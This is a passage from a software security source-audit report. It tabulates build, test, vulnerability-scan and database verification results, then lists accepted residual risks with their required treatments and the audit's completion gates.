| `make -j2 all server kb gateway`, `make hardening-check`, `make build-integrity` | Pass | Shipping binaries are PIE with full RELRO, NX, canaries, fortified libc and CET where supported; strict source/target boundaries pass |
| `go mod verify`, `go test ./...`, latest `govulncheck ./...` in all three Go modules | Pass; no vulnerabilities found | Includes Go 1.26.7 scanner execution and upgraded `golang.org/x/text` |
| Both npm lockfile audits, TypeScript checks and frontend tests | Zero advisories; pass: 21 files / 186 tests | The vulnerable development dependency was removed/upgraded and the lockfiles are internally consistent |
| Six changed Compose definitions via `docker compose config --quiet` | Pass with distinct role-secret fixtures | Syntax and required separated database-role inputs are deployable |

Incremental ACG-018 transport/isolation and final branch verification on 2026-08-27 adds:

| Check | Result | Assurance implication |
| --- | --- | --- |
| Local and `.252` Go 1.26.7 `go mod verify` and `go test ./...` in `server-go`, `control-web` and `runtime-web`; `.252` `govulncheck ./...` | Pass in every package; no vulnerabilities found | Includes egress HTTP/SSE transport, scoped credential handles, C-compatible envelope vectors, callers and Linux subprocess socket-denial/non-dumpability tests; the module minimum and digest-pinned Docker builder stages were raised from the vulnerable Go 1.25 line to 1.26.7 |
| Local and `.252` `make -C src -j4 unit-tests` | Pass: all 659 binaries | Includes the real-bus Git fixture, ciphertext-only forge request assertions, Vault helper parent-attestation negatives and the complete native corpus |
| `.252` `TEST_RUN_JOBS=1 make -C src sanitizers` | Pass: all 659 registered binaries with ASan/UBSan | A clean instrumented build exposed and remediation fixed the missing `module_json_call.o` dependency in the memory-advanced target; the resumed full harness then completed without a sanitizer finding |
| Local and `.252` `make -C src lint` against the intended generated-output index | Pass: all 75 checks | Includes direct-socket inventory plus planted bypass, credential-custody/package ratchets, descriptor ownership, process contracts, event durability and dynamic plugin provisioning |
| Local and `.252` shipping build plus `make -C src build-integrity` | Pass | The shared C egress-envelope client is linked into the server without a module-to-module header crossing; product, linkage, hardening and container credential-bootstrap boundaries remain green |
| Local and `.252` `make -C src integration-tests` | Pass: 70/70 configured checks; 64 service-unconfigured checks stated as skips | Thin-client remote-exclusive and served-argspec end-to-end checks pass; these runs do not relabel absent DB1/KB services as coverage |
| `.252` P1 PostgreSQL 18/pgvector gate plus `subject-erasure-pg-test.sql` in separate disposable databases | Pass | Reconfirms role separation, RLS, WORM/Vault/JWKS and concurrency gates; erasure proves retry idempotency, retention, minimized exactly-once outbox evidence and unchanged prior audit intents; the worker gate proves idempotent SQLite WORM delivery |
| Egress credential-custody tests | Pass locally and on `.252` | Forge uses a 30-second caller/host/operation/repository-bound X25519/AES-GCM envelope; MCP uses only its deterministic caller-scoped handle and the parent-attested non-dumpable Vault bridge |
| Live GitHub GET-only governance probe | Incomplete control: one active `main` deployment ruleset; both environments use the same sole admin reviewer; `testing` protection unreadable with the available token; signing key absent | Confirms that ACG-019/020 operating evidence and separation of duties remain open rather than inferring them from source |

The source checks do not convert the explicitly documented organizational and architectural
residuals into operating evidence. The ACG-011 and ACG-031 source controls now have representative
remote PostgreSQL acceptance evidence, but a production deployment must still prove its own
migration, role posture, schedules and store inventory. External assurance additionally remains
blocked on ACG-018 core-plane/protocol convergence and the ACG-019/020 live organizational evidence.

Dynamic exploitation, authenticated penetration testing, production configuration/IAM, branch
rules, environment reviewers, organization access, cloud/container runtime, external providers,
historical secrets, and operating-policy interviews were outside this source-only run. They remain
mandatory before an external assurance opinion.

Authoritative taxonomy and advisory references used by this audit are the
[NIST Cybersecurity Framework 2.0](https://www.nist.gov/publications/nist-cybersecurity-framework-csf-20),
[NIST SP 800-218 SSDF 1.1](https://csrc.nist.gov/pubs/sp/800/218/final),
[OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/),
[OWASP GenAI/LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/),
and the official [Go vulnerability record for GO-2026-5970](https://pkg.go.dev/vuln/GO-2026-5970).
They provide assessment criteria and vulnerability facts, not certification or legal applicability.

## Accepted only as explicit residual risk

| Risk | Required treatment |
| --- | --- |
| Managed deployment mounts `/var/run/docker.sock` into a privileged service | Treat as host-root authority, dedicate the host, restrict operators/network, monitor Docker events and prefer the split topology; never market it as tenant isolation |
| Host root/admin can read process memory, files, Vault material and local audit state | Harden and monitor the host, separate duties, use hardware/external custody and off-host signed witnesses; document that local controls do not defeat host ownership |
| Third-party models, providers, MCP servers and repositories receive or influence sensitive work | Approve processor/destination and purpose, minimize payloads/credentials, pin artifacts, isolate tools and retain transfer/verdict evidence |
| WORM without an independently held witness/checkpoint remains locally rewriteable by a sufficiently privileged operator | Require external witness custody for regulated/high-assurance claims and continuously verify checkpoint continuity |
| Single-user or loopback deployment assumptions | State and test the supported threat model; loopback is not authentication against local processes, and disabling tenant controls cannot be advertised as multi-user security |

## Completion gates for this audit

- Every externally reachable listener and mutation route has an identified authentication,
  authorization, rate-limit, input-validation, and audit disposition.
- Every credential path and outbound network path has an owner, storage boundary, redaction rule,
  and default-deny or explicit-allow behavior.
- Every durable data category has documented classification, scope, retention, deletion, backup,
  restore, and audit behavior.
- Every claimed tamper-evident or governance control has a default-state check, bypass inventory,
  executable negative test, and operational verification path.
- Every build and release credential has least-privilege permissions, pinned dependencies, artifact
  provenance, and a reproducible promotion record.
- Critical and high findings have owners and acceptance tests. Accepted residual risks name the
  decision authority, rationale, expiration or review date, and compensating controls.
- The final document records commands run, failures, environmental limitations, and the exact
  audited commit.

This source-audit gate is complete. Program completion remains pending until the findings are fixed,
accepted under the exception rules above, and verified in a representative deployment and operating
environment.
